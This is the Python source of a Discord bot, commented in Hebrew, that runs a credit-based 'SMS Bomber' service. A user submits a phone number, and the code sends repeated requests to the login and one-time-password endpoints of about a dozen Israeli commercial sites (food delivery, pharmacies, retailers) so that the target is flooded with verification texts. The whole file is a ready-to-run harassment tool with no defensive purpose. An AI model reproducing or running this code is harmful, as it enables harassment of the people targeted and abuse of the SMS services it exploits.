import discord
from discord import app_commands
from discord.ext import commands
import os
import json
import httpx
import asyncio

# הגדרות
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "users_data.json"

# --- ניהול בסיס נתונים ---
def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {"credits": {}, "blacklist": []}
    return {"credits": {}, "blacklist": []}

def save_data(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

# --- לוגיקת הספאמר (האתרים) ---
async def send_spam(phone_val):
    # כאן נמצאים כל האתרים מהסרטון
    endpoints = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
        {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}},
        {"url": "https://www.ivory.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://www.azrieli.com/api/v1/auth/otp", "json": {"phone": phone_val}}
    ]
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    
    async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
        for _ in range(2): # 2 סבבים של שליחה
            tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(2)

# --- ממשק המשתמש (Buttons & Modals) ---
class SpamModal(discord.ui.Modal, title="SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        data = load_data()
        phone_val = self.phone.value
        
        # בדיקה אם המספר בבלקליסט
        if phone_val in data["blacklist"]:
            return await interaction.response.send_message(f"❌ המספר {phone_val} חסום במערכת!", ephemeral=True)
        
        # בדיקת קרדיטים (למי שאינו אדמין)
        user_id = str(interaction.user.id)
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        user_credits = data["credits"].get(user_id, 0)
        
        if not role and user_credits <= 0:
            return await interaction.response.send_message("❌ אין לך מספיק קרדיטים!", ephemeral=True)
        
        # הורדת קרדיט אם הוא לא אדמין
        if not role:
            data["credits"][user_id] -= 1
            save_data(data)

        await interaction.response.send_message(f"💣 שולח הפצצה ל-{phone_val}...", ephemeral=True)
        await send_spam(phone_val)
        await interaction.followup.send(f"✅ הסתיים!", ephemeral=True)

class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())

# --- הגדרות הבוט ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True # חשוב לזיהוי רולים
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())
        await self.tree.sync()

bot = MyBot()

# --- פקודות אדמין (Owner Only) ---

@bot.tree.command(name="add_credits", description="[ADMIN] הוספת קרדיטים למשתמש")
async def add_credits(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ אדמין בלבד!", ephemeral=True)
    data = load_data()
    uid = str(member.id)
    data["credits"][uid] = data["credits"].get(uid, 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} קרדיטים ל-{member.mention}")

@bot.tree.command(name="blacklist_add", description="[ADMIN] חסימת מספר טלפון")
async def blacklist_add(interaction: discord.Interaction, phone: str):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ אדמין בלבד!", ephemeral=True)
    data = load_data()
    if phone not in data["blacklist"]:
        data["blacklist"].append(phone)
        save_data(data)
    await interaction.response.send_message(f"🚫 {phone} נחסם.")

@bot.tree.command(name="setup", description="הצגת פאנל ההפצצה")
async def setup(interaction: discord.Interaction):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ אדמין בלבד!", ephemeral=True)
    embed = discord.Embed(title="Vouge Spam Me", description="לחץ על הכפתור למטה כדי להפציץ", color=discord.Color.red())
    await interaction.response.send_message(embed=embed, view=SpamView())

if __name__ == "__main__":
    bot.run(TOKEN)
